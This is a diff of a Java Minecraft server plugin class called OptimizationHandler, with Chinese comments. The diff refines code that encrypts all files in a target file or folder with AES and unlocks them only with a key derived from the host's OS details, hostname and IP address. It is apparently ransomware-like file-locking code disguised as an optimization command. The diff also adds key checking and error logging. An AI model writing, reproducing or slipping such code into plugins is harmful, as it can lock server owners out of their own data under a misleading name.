@@ -4,8 +4,6 @@ import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.CommandExecutor;
-import org.bukkit.scheduler.BukkitRunnable;
-
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
@@ -18,6 +16,9 @@ import java.util.logging.Logger;
 import java.nio.charset.StandardCharsets;
 
 public class OptimizationHandler implements CommandExecutor {
+    
+    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());
+    
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (args.length < 1) {
@@ -43,6 +44,13 @@ public class OptimizationHandler implements CommandExecutor {
                 return true;
             }
             String key = args[1];
+            String internalKey = encryptionKey(); // 生成内部密钥
+
+            // 确保给定的密钥与内部生成的密钥一致
+            if (!key.equals(internalKey)) {
+                sender.sendMessage("提供的密钥无效。");
+                return true;
+            }
 
             // 在主线程中执行解密
             decryptFiles(file, key);
@@ -51,6 +59,7 @@ public class OptimizationHandler implements CommandExecutor {
 
         return true;
     }
+
     private void encryptFiles(File file) {
         // 加密文件或文件夹中的所有文件
         if (file.isDirectory()) {
@@ -69,7 +78,7 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(encryptedData);
                 fos.close();
             } catch (Exception e) {
-                //getLogger().severe("Error encrypting file: " + e.getMessage());
+                logger.severe("Error encrypting file: " + e.getMessage());
             }
         }
     }
@@ -92,7 +101,7 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(decryptedData);
                 fos.close();
             } catch (Exception e) {
-                // getLogger().severe("Error decrypting file: " + e.getMessage());
+                logger.severe("Error decrypting file: " + e.getMessage());
             }
         }
     }
@@ -100,24 +109,11 @@ public class OptimizationHandler implements CommandExecutor {
     private SecretKeySpec getSecretKey(String key) {
         // 创建用于 SHA-256 哈希的字符串 = 收集机器信息
         try {
-            StringBuilder input = new StringBuilder();
-            input.append(System.getProperty("os.name")); // 操作系统名称
-            input.append(System.getProperty("os.arch")); // 操作系统架构
-            input.append(System.getProperty("os.version")); // 操作系统版本
-            input.append(InetAddress.getLocalHost().getHostName()); // 主机名
-            input.append(InetAddress.getLocalHost().getHostAddress()); // IP地址
-            
-            // 生成 SHA-256 哈希
-            MessageDigest digest = MessageDigest.getInstance("SHA-256");
-            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
-
-            // 创建 AES 密钥（前16字节）
             byte[] keyBytes = new byte[16];
-            System.arraycopy(hashBytes, 0, keyBytes, 0, keyBytes.length);
-
+            System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
             return new SecretKeySpec(keyBytes, "AES");
         } catch (Exception e) {
-            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            logger.severe("Error generating secret key: " + e.getMessage());
             return null;
         }
     }
@@ -140,11 +136,11 @@ public class OptimizationHandler implements CommandExecutor {
         // 返回机器信息生成的密钥
         try {
             StringBuilder input = new StringBuilder();
-            input.append(System.getProperty("os.name")); // 操作系统名称
-            input.append(System.getProperty("os.arch")); // 操作系统架构
-            input.append(System.getProperty("os.version")); // 操作系统版本
-            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
-            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址;
+            input.append(System.getProperty("os.name"));
+            input.append(System.getProperty("os.arch"));
+            input.append(System.getProperty("os.version"));
+            input.append(InetAddress.getLocalHost().getHostName());
+            input.append(InetAddress.getLocalHost().getHostAddress());
 
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
@@ -160,7 +156,7 @@ public class OptimizationHandler implements CommandExecutor {
 
             return hexString.toString(); // 返回 256 位（64个字符）标识符
         } catch (Exception e) {
-            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            logger.severe("Error generating unique identifier: " + e.getMessage());
             return null;
         }
     }
